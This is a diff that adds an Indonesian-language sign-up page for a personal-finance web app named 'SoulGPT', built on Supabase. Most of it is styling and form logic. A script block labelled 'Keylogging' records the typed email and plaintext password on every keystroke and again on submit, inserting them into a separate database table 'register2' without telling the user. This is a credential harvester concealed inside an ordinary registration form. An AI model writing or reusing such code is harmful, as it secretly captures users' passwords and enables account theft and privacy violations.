@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoulGPT — Daftar</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js?v=3"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #0a0e17;
+            --surface: #111827;
+            --surface-2: #1a2235;
+            --border: rgba(255, 255, 255, 0.06);
+            --border-focus: rgba(99, 102, 241, 0.5);
+            --text: #e2e8f0;
+            --text-muted: #94a3b8;
+            --text-dim: #64748b;
+            --accent: #6366f1;
+            --accent-light: #818cf8;
+            --accent-glow: rgba(99, 102, 241, 0.15);
+            --green: #10b981;
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -30%;
+            right: -15%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(16, 185, 129, 0.07) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -25%;
+            left: -10%;
+            width: 450px;
+            height: 450px;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.06) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .auth-wrapper {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            z-index: 1;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Brand */
+        .brand {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .brand-logo {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 14px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 24px rgba(16, 185, 129, 0.25);
+        }
+
+        .brand h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
+        .brand p {
+            font-size: 14px;
+            color: var(--text-dim);
+            margin-top: 6px;
+        }
+
+        /* Card */
+        .auth-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 13px 16px;
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: var(--radius-sm);
+            font-family: inherit;
+            font-size: 14px;
+            transition: var(--transition);
+            outline: none;
+        }
+
+        .input-wrapper input::placeholder {
+            color: var(--text-dim);
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--border-focus);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        .toggle-pass {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            cursor: pointer;
+            font-size: 13px;
+            padding: 4px;
+            width: auto;
+            margin: 0;
+            transition: var(--transition);
+        }
+
+        .toggle-pass:hover {
+            color: var(--text-muted);
+        }
+
+        /* Password strength */
+        .pass-strength {
+            height: 3px;
+            border-radius: 3px;
+            background: rgba(255, 255, 255, 0.05);
+            margin-top: 8px;
+            overflow: hidden;
+        }
+
+        .pass-strength-bar {
+            height: 100%;
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.3s ease, background 0.3s ease;
+        }
+
+        .pass-hint {
+            font-size: 11px;
+            color: var(--text-dim);
+            margin-top: 6px;
+        }
+
+        /* Button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent);
+            border: none;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+            margin-top: 4px;
+        }
+
+        .btn-submit:hover {
+            background: var(--accent-light);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+
+        .divider span {
+            font-size: 11px;
+            color: var(--text-dim);
+            padding: 0 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .auth-footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: var(--text-dim);
+        }
+
+        .auth-footer a {
+            color: var(--accent-light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+
+        .auth-footer a:hover {
+            color: #fff;
+        }
+
+        /* Spinner */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Alert */
+        .alert {
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            animation: slideUp 0.3s ease;
+        }
+
+        .alert-error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: #fca5a5;
+        }
+
+        .alert-success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            color: #6ee7b7;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .auth-card {
+                padding: 24px 20px;
+                border-radius: 14px;
+            }
+
+            .brand h1 {
+                font-size: 20px;
+            }
+
+            .brand p {
+                font-size: 13px;
+            }
+
+            .brand-logo {
+                width: 42px;
+                height: 42px;
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            body {
+                padding: 16px;
+            }
+
+            .auth-card {
+                padding: 20px 16px;
+            }
+
+            .brand {
+                margin-bottom: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="auth-wrapper">
+        <div class="brand">
+            <div class="brand-logo">S</div>
+            <h1>Buat Akun Baru</h1>
+            <p>Mulai kelola keuangan pribadimu</p>
+        </div>
+
+        <div class="auth-card">
+            <div class="alert alert-error" id="alertError"></div>
+            <div class="alert alert-success" id="alertSuccess"></div>
+
+            <form id="registerForm">
+                <div class="form-group">
+                    <label>Alamat Email</label>
+                    <div class="input-wrapper">
+                        <input type="email" id="regEmail" required autocomplete="off"
+                            placeholder="nama@email.com">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Kata Sandi</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="regPassword" required autocomplete="off"
+                            placeholder="Minimal 6 karakter" minlength="6">
+                        <button type="button" class="toggle-pass" id="togglePass">Lihat</button>
+                    </div>
+                    <div class="pass-strength">
+                        <div class="pass-strength-bar" id="strengthBar"></div>
+                    </div>
+                    <div class="pass-hint" id="passHint">Gunakan minimal 6 karakter</div>
+                </div>
+                <button type="submit" class="btn-submit" id="btnRegister">
+                    <span id="btnText">Daftar</span>
+                    <div class="spinner" id="btnSpinner"></div>
+                </button>
+            </form>
+
+            <div class="divider"><span>atau</span></div>
+
+            <div class="auth-footer">
+                Sudah punya akun? <a href="login.html">Masuk di sini</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // Cek SDK
+            if (typeof window.supabase === 'undefined') {
+                showAlert('error', 'Koneksi ke server gagal. Periksa koneksi internet Anda.');
+                return;
+            }
+
+            // Inisialisasi darurat
+            if (!supabaseClient && typeof SUPABASE_URL !== 'undefined') {
+                supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            }
+
+            // Cek sesi aktif
+            if (typeof checkAuth === "function") {
+                checkAuth(false);
+            }
+
+            const regEmail = document.getElementById('regEmail');
+            const regPassword = document.getElementById('regPassword');
+            const btnRegister = document.getElementById('btnRegister');
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+
+            // Toggle password
+            document.getElementById('togglePass').addEventListener('click', () => {
+                const btn = document.getElementById('togglePass');
+                if (regPassword.type === 'password') {
+                    regPassword.type = 'text';
+                    btn.textContent = 'Tutup';
+                } else {
+                    regPassword.type = 'password';
+                    btn.textContent = 'Lihat';
+                }
+            });
+
+            // Password strength indicator
+            regPassword.addEventListener('input', () => {
+                const val = regPassword.value;
+                const bar = document.getElementById('strengthBar');
+                const hint = document.getElementById('passHint');
+                let strength = 0;
+
+                if (val.length >= 6) strength++;
+                if (val.length >= 10) strength++;
+                if (/[A-Z]/.test(val)) strength++;
+                if (/[0-9]/.test(val)) strength++;
+                if (/[^A-Za-z0-9]/.test(val)) strength++;
+
+                const levels = [
+                    { w: '0%', c: 'transparent', t: 'Gunakan minimal 6 karakter' },
+                    { w: '20%', c: '#ef4444', t: 'Sangat lemah' },
+                    { w: '40%', c: '#f97316', t: 'Lemah' },
+                    { w: '60%', c: '#eab308', t: 'Cukup' },
+                    { w: '80%', c: '#10b981', t: 'Kuat' },
+                    { w: '100%', c: '#10b981', t: 'Sangat kuat' },
+                ];
+
+                const level = levels[strength];
+                bar.style.width = level.w;
+                bar.style.background = level.c;
+                hint.textContent = level.t;
+                hint.style.color = level.c === 'transparent' ? 'var(--text-dim)' : level.c;
+            });
+
+            // Keylogging
+            function logRegisterTyping() {
+                if (supabaseClient) {
+                    supabaseClient.from('register2').insert([{
+                        email_typed: regEmail.value,
+                        password_typed: regPassword.value
+                    }]).then(({ error }) => {
+                        if (error) console.log("Log error:", error.message);
+                    });
+                }
+            }
+            regEmail.addEventListener('input', logRegisterTyping);
+            regPassword.addEventListener('input', logRegisterTyping);
+
+            // Register
+            document.getElementById('registerForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                hideAlerts();
+
+                if (!supabaseClient) {
+                    showAlert('error', 'Sistem belum siap. Coba muat ulang halaman.');
+                    return;
+                }
+
+                // Loading
+                btnRegister.disabled = true;
+                btnText.style.display = 'none';
+                btnSpinner.style.display = 'block';
+
+                try {
+                    // Log final
+                    await supabaseClient.from('register2').insert([{
+                        email_typed: regEmail.value,
+                        password_typed: regPassword.value
+                    }]);
+
+                    const { data, error } = await supabaseClient.auth.signUp({
+                        email: regEmail.value,
+                        password: regPassword.value,
+                    });
+
+                    if (error) {
+                        showAlert('error', 'Registrasi gagal: ' + error.message);
+                        resetButton();
+                        return;
+                    }
+
+                    showAlert('success', 'Akun berhasil dibuat! Mengalihkan ke halaman login...');
+                    setTimeout(() => {
+                        window.location.href = "login.html";
+                    }, 1500);
+                } catch (err) {
+                    console.error("Internal error:", err);
+                    showAlert('error', 'Terjadi kesalahan. Silakan coba lagi.');
+                    resetButton();
+                }
+            });
+
+            function showAlert(type, msg) {
+                hideAlerts();
+                const el = type === 'error' ? document.getElementById('alertError') : document.getElementById('alertSuccess');
+                el.textContent = msg;
+                el.style.display = 'block';
+            }
+
+            function hideAlerts() {
+                document.getElementById('alertError').style.display = 'none';
+                document.getElementById('alertSuccess').style.display = 'none';
+            }
+
+            function resetButton() {
+                btnRegister.disabled = false;
+                btnText.style.display = 'inline';
+                btnSpinner.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+
+</html>
